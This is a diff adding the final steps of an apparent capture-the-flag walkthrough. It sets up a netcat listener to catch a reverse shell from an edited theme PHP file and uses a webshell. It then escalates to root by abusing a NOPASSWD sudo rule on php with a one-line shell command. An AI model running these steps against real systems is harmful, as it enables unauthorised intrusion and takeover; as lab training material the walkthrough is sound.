@@ -162,3 +162,46 @@ Now we have the credentials, we can log on as `admin`
 
 ![[2_theme_php_file.png]]
 
+I set the listener on port 7777:
+
+```shell
+nc -lvnp 7777
+```
+
+And executing the file form the server to get a shell
+
+![](2_shell.png)
+
+In this case, I prefered a `webshell` so I used PwnyShell 
+
+![](2_pwnyshell.png)
+
+Now we look for the flag:
+
+![](02_flaguser.png)
+
+### After obtaining a foothold on the target, escalate privileges to root and submit the contents of the root.txt flag.
+
+We started with `sudo -l` to get the files that can be executed by sudo and *we have luck*
+
+We get
+```shell
+sudo -l
+
+# Output
+Matching Defaults entries for www-data on gettingstarted:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on gettingstarted:
+    (ALL : ALL) NOPASSWD: /usr/bin/php
+```
+
+Now we look for a php payload to root the shell and we get:
+
+```shell
+sudo /usr/bin/php -r 'system("/bin/sh -i");'
+```
+
+![](02_ROOT_FLAG.png)
+
+AND WE GOT THE LAST FLAG 
